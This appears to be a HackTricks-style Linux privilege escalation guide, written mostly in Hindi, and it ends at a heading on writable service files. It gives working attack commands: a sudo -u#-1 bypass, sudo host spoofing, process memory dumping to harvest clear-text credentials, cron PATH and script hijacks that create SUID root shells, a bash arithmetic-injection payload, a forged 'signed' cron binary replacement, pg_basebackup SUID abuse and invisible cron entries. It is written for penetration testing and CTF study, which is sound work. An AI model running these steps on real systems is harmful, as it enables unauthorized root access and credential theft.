# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

आइए चल रहे OS के बारे में कुछ जानकारी हासिल करना शुरू करें
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आपकी **`PATH` वेरिएबल के किसी भी फोल्डर पर write permissions हैं** तो आप कुछ libraries या binaries को hijack कर सकते हैं:
```bash
echo $PATH
```
### Env info

क्या environment variables में कोई रोचक जानकारी, passwords या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel version की जाँच करें और यह देखें कि कोई exploit मौजूद है जिसे escalate privileges के लिए इस्तेमाल किया जा सके।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप यहाँ एक अच्छी vulnerable kernel list और कुछ पहले से ही **compiled exploits** पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
अन्य साइटें जहाँ आप कुछ **compiled exploits** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेब से सभी vulnerable kernel versions निकालने के लिए आप यह कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits खोजने में मदद करने वाले टूल:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, केवल kernel 2.x के लिए exploits को चेक करता है)

हमेशा **search the kernel version in Google**, शायद आपका kernel version किसी kernel exploit में लिखा हुआ हो और तब आप सुनिश्चित हो सकते हैं कि यह exploit वैध है।

अतिरिक्त kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo संस्करण

निम्नलिखित में दिखाई देने वाले कमजोर sudo संस्करणों के आधार पर:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके जाँच सकते हैं कि sudo संस्करण vulnerable है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo के 1.9.17p1 से पहले के संस्करण (**1.9.14 - 1.9.17 < 1.9.17p1**) असाधिकार प्राप्त स्थानीय उपयोगकर्ताओं को sudo `--chroot` विकल्प के माध्यम से root तक अपनी privileges बढ़ाने की अनुमति देते हैं जब `/etc/nsswitch.conf` फ़ाइल किसी user-controlled डायरेक्टरी से उपयोग की जाती है।

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Exploit चलाने से पहले, सुनिश्चित करें कि आपका `sudo` संस्करण कमजोर है और यह `chroot` फीचर को सपोर्ट करता है।

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo के 1.9.17p1 से पहले (रिपोर्ट किए गए प्रभावित रेंज: **1.8.8–1.9.17**) host-based sudoers नियमों का मूल्यांकन `sudo -h <host>` से प्राप्त **user-supplied hostname** का उपयोग करके कर सकता है न कि **real hostname** का। यदि sudoers किसी अन्य host पर अधिक व्यापक privileges देता है, तो आप स्थानीय रूप से उस host को **spoof** कर सकते हैं।

Requirements:
- प्रभावित `sudo` संस्करण
- Host-specific sudoers नियम (host न तो current hostname है न ही `ALL`)

Example sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit द्वारा अनुमत होस्ट को स्पूफ करके:
```bash
sudo -h devbox id
sudo -h devbox -i
```
यदि spoofed name के resolution को block किया जा रहा है, तो इसे `/etc/hosts` में जोड़ें या DNS lookups से बचने के लिए ऐसे hostname का उपयोग करें जो पहले से logs/configs में दिखाई देता हो।

#### sudo < v1.8.28

स्रोत: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg सिग्नेचर सत्यापन विफल

इस vuln को कैसे exploit किया जा सकता है इसका **उदाहरण** देखने के लिए **smasher2 box of HTB** देखें
```bash
dmesg 2>/dev/null | grep "signature"
```
### और system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित सुरक्षा उपायों को सूचीबद्ध करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

यदि आप कंटेनर के अंदर हैं, तो पहले निम्नलिखित container-security अनुभाग से शुरू करें और फिर runtime-specific abuse पृष्ठों में pivot करें:

{{#ref}}
container-security/
{{#endref}}

## ड्राइव्स

जाँचें **क्या mounted और unmounted है**, कहाँ और क्यों। यदि कुछ भी unmounted है तो आप उसे mount करने की कोशिश कर सकते हैं और निजी जानकारी की जाँच कर सकते हैं
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी binaries सूचीबद्ध करें
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
साथ ही जाँच करें कि **any compiler is installed**। यह उपयोगी है अगर आपको किसी kernel exploit का उपयोग करना पड़े क्योंकि सलाह दी जाती है कि इसे उसी मशीन पर compile करें जहाँ आप इसे उपयोग करने जा रहे हैं (या किसी समान मशीन पर)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### कमजोर सॉफ्टवेयर स्थापित

**स्थापित पैकेजों और सेवाओं के संस्करण** की जाँच करें। शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) हो जिसे escalating privileges के लिए exploit किया जा सके…\
अनुशंसा की जाती है कि अधिक संदिग्ध रूप से स्थापित सॉफ्टवेयर के संस्करण को मैन्युअली जाँचा जाए।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन के लिए SSH एक्सेस है, तो आप मशीन के अंदर इंस्टॉल किए गए पुराने और vulnerable सॉफ़्टवेयर की जाँच के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये कमांड बहुत सारी जानकारी दिखाएंगे जो ज्यादातर बेकार होगी, इसलिए OpenVAS या समान कुछ applications का उपयोग करने की सलाह दी जाती है जो यह जांचें कि कोई इंस्टॉल किया गया सॉफ़्टवेयर संस्करण ज्ञात exploits के लिए vulnerable है या नहीं_

## प्रक्रियाएँ

देखें कि **what processes** चल रहे हैं और यह जाँचें कि क्या किसी process के पास आवश्यक से **more privileges than it should** तो नहीं हैं (उदाहरण के लिए tomcat को root द्वारा चलाया जा रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
हमेशा यह जांचें कि कोई [**electron/cef/chromium debuggers** चल रहे हैं, आप इसका दुरुपयोग करके escalate privileges कर सकते हैं](electron-cef-chromium-debugger-abuse.md). **Linpeas** process की command line में `--inspect` parameter देखकर इन्हें पता लगाता है.\
Also **check your privileges over the processes binaries**, शायद आप उन्हें overwrite कर सकें।

### क्रॉस-यूज़र पैरेंट-चाइल्ड चेन

एक child process जो अपने parent से किसी **different user** के तहत चल रहा है, स्वचालित रूप से malicious नहीं होता, लेकिन यह एक उपयोगी **triage signal** है। कुछ transitions अपेक्षित होते हैं (`root` spawning a service user, login managers creating session processes), लेकिन असामान्य chains wrappers, debug helpers, persistence, या weak runtime trust boundaries को उजागर कर सकती हैं।

त्वरित समीक्षा:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
यदि आप कोई आश्चर्यजनक chain पाते हैं, तो parent command line और उन सभी फ़ाइलों की जाँच करें जो इसके व्यवहार को प्रभावित करती हैं (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments)। कई वास्तविक privesc paths में child स्वयं writable नहीं था, लेकिन **parent-controlled config** या helper chain writable था।

### Deleted executables and deleted-open files

Runtime artifacts अक्सर **डिलीट होने के बाद** भी उपलब्ध रहते हैं। यह privilege escalation दोनों के लिए उपयोगी है और उस प्रोसेस से साक्ष्य recover करने के लिए जो पहले से ही संवेदनशील फाइलें खुली रखता है।

Deleted executables की जाँच करें:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
यदि `/proc/<PID>/exe` `(deleted)` की ओर इशारा करता है, तो प्रक्रिया अभी भी मेमोरी से पुराने binary image को चला रही होती है। यह जांच करने का एक मजबूत संकेत है क्योंकि:

- हटाया गया executable में रोचक strings या credentials हो सकते हैं
- चल रही process अभी भी उपयोगी file descriptors expose कर सकती है
- एक deleted privileged binary हालिया tampering या attempted cleanup का संकेत दे सकता है

सिस्टम भर में deleted-open files इकट्ठा करें:
```bash
lsof +L1
```
यदि आप कोई दिलचस्प descriptor पाते हैं, तो उसे सीधे recover करें:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
यह विशेष रूप से तब बेहद उपयोगी होता है जब किसी प्रक्रिया के पास अभी भी कोई deleted secret, script, database export, या flag file खुला हुआ हो।

### Process monitoring

आप [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग processes की निगरानी के लिए कर सकते हैं। यह अक्सर बार-बार executed होने वाली या जब किसी शर्त के पूरा होने पर चलने वाली vulnerable processes की पहचान करने में बहुत उपयोगी हो सकता है।

### Process memory

कुछ सेवाएँ सर्वर की मेमोरी के अंदर **credentials को clear text में** सेव करती हैं।\
आम तौर पर अन्य users से संबंधित processes की मेमोरी पढ़ने के लिए आपको **root privileges** की आवश्यकता होगी, इसलिए यह आमतौर पर तब अधिक उपयोगी होता है जब आप पहले से ही root हैं और और अधिक credentials खोजना चाहते हैं।\
हालांकि, ध्यान रखें कि **as a regular user आप उन processes की मेमोरी पढ़ सकते हैं जो आपके own हैं**।

> [!WARNING]
> नोट करें कि आजकल अधिकांश मशीनें डिफ़ॉल्ट रूप से **ptrace की अनुमति नहीं देतीं**, जिसका अर्थ है कि आप अपने unprivileged user से संबंधित अन्य processes को dump नहीं कर सकते। 
>
> फ़ाइल _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की पहुँच को नियंत्रित करती है:
>
> - **kernel.yama.ptrace_scope = 0**: सभी processes को debug किया जा सकता है, बशर्ते कि उनका uid समान हो। यह ptracing का पारंपरिक व्यवहार है।
> - **kernel.yama.ptrace_scope = 1**: केवल parent process को debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability आवश्यक है।
> - **kernel.yama.ptrace_scope = 3**: किसी भी प्रक्रिया को ptrace से trace नहीं किया जा सकता। एक बार सेट होने पर ptracing को फिर से सक्षम करने के लिए reboot करना आवश्यक होता है।

#### GDB

यदि आपको किसी FTP service (उदाहरण के लिए) की मेमोरी तक पहुँच मिलती है, तो आप Heap प्राप्त करके उसके अंदर के credentials को खोज सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए प्रोसेस ID के लिए, **maps दिखाते हैं कि उस प्रक्रिया के वर्चुअल एड्रेस स्पेस के भीतर memory कैसे mapped है**; यह **प्रत्येक mapped region के permissions** भी दिखाता है।  
यह **mem** pseudo फ़ाइल **प्रक्रिया की मेमोरी को स्वयं उजागर करती है**। **maps** फ़ाइल से हमें पता चलता है कि कौन से **memory regions readable हैं** और उनके offsets क्या हैं। हम इस जानकारी का उपयोग करके **mem फ़ाइल में seek करके सभी readable regions को dump** करके एक फ़ाइल में सेव करते हैं।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच प्रदान करता है, न कि वर्चुअल मेमोरी। kernel के वर्चुअल एड्रेस स्पेस तक /dev/kmem के माध्यम से पहुँच प्राप्त की जा सकती है.\

Typically, `/dev/mem` is only readable by **root** and **kmem** समूह.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump, Windows के लिए Sysinternals suite के क्लासिक ProcDump टूल का Linux के लिए नया रूप है। इसे यहाँ प्राप्त करें: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### टूल्स

To dump a process memory you could use:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअली root आवश्यकताएँ हटाकर आपके स्वामित्व वाले process को dump कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root की आवश्यकता है)

### प्रोसेस मेमोरी से क्रेडेंशियल्स

#### मैनुअल उदाहरण

If you find that the authenticator process is running:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के सेक्शन देखें ताकि process की memory को dump करने के विभिन्न तरीके मिलें) और memory के अंदर credentials खोज सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) मेमोरी से और कुछ **well known files** से **clear text credentials** चुरा लेगा। यह ठीक से काम करने के लिए root privileges की आवश्यकता करता है।

| विशेषता                                           | प्रोसेस नाम         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

यदि web “Crontab UI” panel (alseambusher/crontab-ui) root के रूप में चल रहा है और केवल loopback से बाइंड है, तो आप SSH local port-forwarding के माध्यम से फिर भी इसे एक्सेस कर सकते हैं और एक privileged job बनाकर escalate कर सकते हैं।

आम प्रक्रिया
- Loopback-only port (e.g., 127.0.0.1:8000) और Basic-Auth realm का पता लगाएँ via `ss -ntlp` / `curl -v localhost:8000`
- ऑपरेशनल artifacts में credentials खोजें:
  - Backups/scripts जिनमें `zip -P <password>` उपयोग हुआ हो
  - systemd unit जो `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` एक्सपोज़ कर रहा हो
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएं और तुरंत चलाएँ (SUID shell देता है):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसे इस्तेमाल करें:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI को root के रूप में न चलाएँ; समर्पित user और न्यूनतम permissions के साथ सीमित करें
- localhost पर bind करें और अतिरिक्त रूप से access को firewall/VPN के माध्यम से सीमित करें; passwords पुनः उपयोग न करें
- unit files में secrets embed करने से बचें; secret stores या केवल root के लिए EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging सक्षम करें

जाँच करें कि कोई scheduled job vulnerable तो नहीं है। शायद आप उस script का फायदा उठा सकें जो root द्वारा execute होता है (wildcard vuln? क्या आप root द्वारा उपयोग की जाने वाली files को modify कर सकते हैं? symlinks का उपयोग करें? root जो directory उपयोग करता है उसमें specific files बना दें?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
यदि `run-parts` का उपयोग किया जाता है, तो जाँच करें कि वास्तव में कौन से नाम चलेँगे:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
यह false positives से बचाता है। एक writable periodic directory केवल तभी उपयोगी है जब आपका payload filename स्थानीय `run-parts` नियमों से मेल खाता हो।

### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि उपयोगकर्ता "user" के पास /home/user पर लिखने की अनुमतियाँ हैं_)

यदि इस crontab के अंदर root किसी कमांड या स्क्रिप्ट को PATH सेट किए बिना execute करने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तब आप निम्न का उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron जो एक script में wildcard का उपयोग करता है (Wildcard Injection)

यदि कोई script root द्वारा execute किया जाता है और कमांड के भीतर “**\***” होता है, तो आप इसका फायदा उठाकर अनपेक्षित चीज़ें (जैसे privesc) कर सकते हैं। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard किसी path जैसे** _**/some/path/\***_ **से पहले आता है, यह vulnerable नहीं है (यहां तक कि** _**./\***_ **भी नहीं)।**

अधिक wildcard exploitation tricks के लिए निम्न पृष्ठ पढ़ें:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. अगर कोई root cron/parser untrusted log fields पढ़ता है और उन्हें arithmetic context में भेजता है, तो attacker एक command substitution $(...) inject कर सकता है जो cron चलने पर root के रूप में execute होता है।

- क्यों यह काम करता है: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. इसलिए एक value जैसे `$(/bin/bash -c 'id > /tmp/pwn')0` पहले substitute होता है (command चलता है), फिर शेष numeric `0` arithmetic के लिए उपयोग किया जाता है ताकि script बिना errors के जारी रहे।

- सामान्य vulnerable पैटर्न:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: parsed log में attacker-controlled text लिखवाएँ ताकि वह numeric-looking field एक command substitution रखे और किसी digit पर समाप्त हो। सुनिश्चित करें कि आपका command stdout पर कुछ print न करे (या उसे redirect करें) ताकि arithmetic वैध रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

यदि आप **cron script को modify कर सकते हैं** जो root द्वारा execute होता है, तो आप बहुत आसानी से shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि root द्वारा निष्पादित script किसी **directory where you have full access** का उपयोग करती है, तो उस folder को delete करके और किसी अन्य स्थान की ओर एक **symlink folder** बनाकर जिसमें आपकी नियंत्रित script serve करे, यह उपयोगी हो सकता है।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink सत्यापन और सुरक्षित फ़ाइल हैंडलिंग

जब आप उन privileged scripts/binaries की समीक्षा कर रहे हों जो path के जरिए फ़ाइलें पढ़ते या लिखते हैं, तो यह सुनिश्चित करें कि links कैसे हैंडल किए जाते हैं:

- `stat()` एक symlink का अनुसरण करता है और target का metadata लौटाता है.
- `lstat()` लिंक स्वयं का metadata लौटाता है.
- `readlink -f` and `namei -l` अंतिम target को resolve करने और प्रत्येक path component के permissions दिखाने में मदद करते हैं.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
For defenders/developers, symlink tricks के खिलाफ सुरक्षित पैटर्न में शामिल हैं:

- `O_EXCL` with `O_CREAT`: पथ पहले से मौजूद होने पर fail करें (attacker द्वारा pre-created links/files को रोकता है)।
- `openat()`: एक trusted directory file descriptor के सापेक्ष operate करें।
- `mkstemp()`: secure permissions के साथ temporary files atomically बनाएं।

### Custom-signed cron binaries with writable payloads
Blue teams कभी-कभी cron-driven binaries को "sign" करती हैं by dumping a custom ELF section और vendor string के लिए grep करने के बाद उन्हें root के रूप में execute करने से पहले। अगर वह binary group-writable है (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) और आप signing material को leak कर सकते हैं, तो आप section को forge करके cron task को hijack कर सकते हैं:

1. verification flow capture करने के लिए `pspy` का उपयोग करें। In Era, root ने `objcopy --dump-section .text_sig=text_sig_section.bin monitor` चलाया followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` और फिर फ़ाइल को execute किया।
2. leaked key/config (from `signing.zip`) का उपयोग करके अपेक्षित certificate को recreate करें:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. एक malicious replacement बनाएं (उदा., drop a SUID bash, add your SSH key) और certificate को `.text_sig` में embed करें ताकि grep पास हो:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. scheduled binary को overwrite करें जबकि execute bits को बनाए रखें:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. अगले cron run का इंतज़ार करें; जैसे ही naive signature check सफल हो जाता है, आपका payload root के रूप में चल जाएगा।

### Frequent cron jobs

आप processes को monitor कर सकते हैं ताकि उन processes को खोजा जा सके जो हर 1, 2 या 5 मिनट में execute हो रहे हैं। शायद आप इसका लाभ उठा कर privileges escalate कर सकें।

For example, to **1 मिनट के दौरान हर 0.1s पर मॉनिटर करने के लिए**, **कम से चलने वाले कमांड्स के अनुसार sort करने के लिए** और उन कमांड्स को delete करने के लिए जो सबसे अधिक execute हुए हैं, आप कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप भी उपयोग कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह शुरू होने वाली प्रत्येक प्रक्रिया की निगरानी करेगा और सूचीबद्ध करेगा)।

### Root बैकअप जो attacker द्वारा सेट किए गए mode bits को संरक्षित करते हैं (pg_basebackup)

यदि किसी root-स्वामित्व वाले cron द्वारा `pg_basebackup` (या कोई भी recursive copy) किसी database directory के खिलाफ चलाया जाता है जिसे आप लिख सकते हैं, तो आप एक **SUID/SGID binary** रख सकते हैं जो backup output में समान mode bits के साथ **root:root** के रूप में पुनः कॉपी हो जाएगा।

Typical discovery flow (as a low-priv DB user):
- `pspy` का उपयोग करके यह देखें कि कोई root cron हर मिनट कुछ इस तरह कॉल कर रहा है: `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- पुष्टि करें कि source cluster (उदा., `/var/lib/postgresql/14/main`) आपके लिए writable है और destination (`/opt/backups/current`) नौकरी के बाद root का मालिकाना बन जाता है।

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
This works because `pg_basebackup` preserves file mode bits when copying the cluster; when invoked by root the destination files inherit **root ownership + attacker-chosen SUID/SGID**. किसी भी समान privileged backup/copy routine जो permissions बनाए रखता है और किसी executable location में लिखता है वह vulnerable होता है।

### Invisible cron jobs

यह संभव है कि एक cronjob बनाया जाए जिसमें टिप्पणी के बाद एक carriage return रखा गया हो (बिना newline character के), और cron job काम करेगा। उदाहरण (carriage return char पर ध्यान दें):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
इस तरह के stealth entry का पता लगाने के लिए, control characters को उजागर करने वाले tools के साथ cron files की जाँच करें:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## सेवाएँ

### लिखने योग्य _.service_ फाइलें

